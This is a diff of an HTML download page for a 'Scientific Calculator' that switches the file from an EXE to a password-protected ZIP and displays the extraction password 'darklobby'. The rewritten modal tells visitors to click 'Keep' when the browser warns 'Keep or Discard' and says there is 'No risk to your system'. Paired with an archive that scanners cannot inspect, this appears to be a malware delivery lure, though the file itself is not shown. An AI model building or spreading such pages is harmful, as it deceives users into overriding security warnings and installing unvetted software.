@@ -25,7 +25,6 @@
             min-height: 100vh;
         }
 
-        /* Header Section */
         .header { text-align: center; margin-bottom: 50px; }
         .header h1 {
             font-family: 'Orbitron';
@@ -35,7 +34,6 @@
         }
         .header p { color: var(--dim); font-size: 0.9rem; margin-top: 10px; }
 
-        /* Software List */
         .software-list { max-width: 800px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
 
         .app-item {
@@ -89,6 +87,17 @@
         .modal-content h2 { font-family: 'Orbitron'; font-size: 1.2rem; margin-bottom: 15px; color: #fff; }
         .modal-content p { color: #ccc; line-height: 1.6; font-size: 0.95rem; margin-bottom: 25px; }
 
+        /* Password Tag Style */
+        .password-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px dashed var(--primary);
+            padding: 10px;
+            margin: 15px 0;
+            font-family: 'Orbitron';
+            color: var(--primary);
+            font-size: 1.1rem;
+        }
+
         .modal-btns { display: flex; gap: 10px; justify-content: center; }
         .btn-confirm {
             background: var(--primary); color: white; border: none;
@@ -115,10 +124,10 @@
     <div class="software-list">
         <div class="app-item">
             <div class="app-info">
-                <div class="app-icon"><i class="fas fa-calculator"></i></div>
+                <div class="app-icon"><i class="fas fa-file-zipper"></i></div>
                 <div class="app-details">
                     <h3>Scientific Calculator</h3>
-                    <span>v1.0.0 | Windows EXE | 2.5 MB</span>
+                    <span>v1.0.0 | Password Protected ZIP | 2.4 MB</span>
                 </div>
             </div>
             <button class="dl-trigger" onclick="openModal()">
@@ -130,14 +139,16 @@
     <div class="modal-overlay" id="downloadModal">
         <div class="modal-content">
             <i class="fas fa-shield-check security-icon"></i>
-            <h2>SECURITY VERIFICATION</h2>
+            <h2>SAFE & VERIFIED</h2>
             <p>
-                <strong>Safe and verified download.</strong><br><br>
-                If prompted with “Keep or Discard,” select <strong>Keep</strong>. 
-                There is no risk to your system.
+                This is a secure zip file. If prompted with “Keep or Discard,” select <strong>Keep</strong>. No risk to your system.
             </p>
+            
+            <p style="margin-bottom: 5px; font-size: 0.8rem; color: var(--dim);">ZIP EXTRACTION PASSWORD:</p>
+            <div class="password-box">darklobby</div>
+
             <div class="modal-btns">
-                <a href="downloads/ScientificCalculator.exe" download id="finalDownload" class="btn-confirm" onclick="closeModal()">PROCEED</a>
+                <a href="downloads/ScientificCalculator.zip" download id="finalDownload" class="btn-confirm" onclick="closeModal()">PROCEED</a>
                 <button class="btn-cancel" onclick="closeModal()">CANCEL</button>
             </div>
         </div>
@@ -151,17 +162,12 @@
         function openModal() {
             document.getElementById('downloadModal').style.display = 'flex';
         }
-
         function closeModal() {
             document.getElementById('downloadModal').style.display = 'none';
         }
-
-        // Close modal if user clicks outside the content
         window.onclick = function(event) {
             let modal = document.getElementById('downloadModal');
-            if (event.target == modal) {
-                closeModal();
-            }
+            if (event.target == modal) { closeModal(); }
         }
     </script>
 
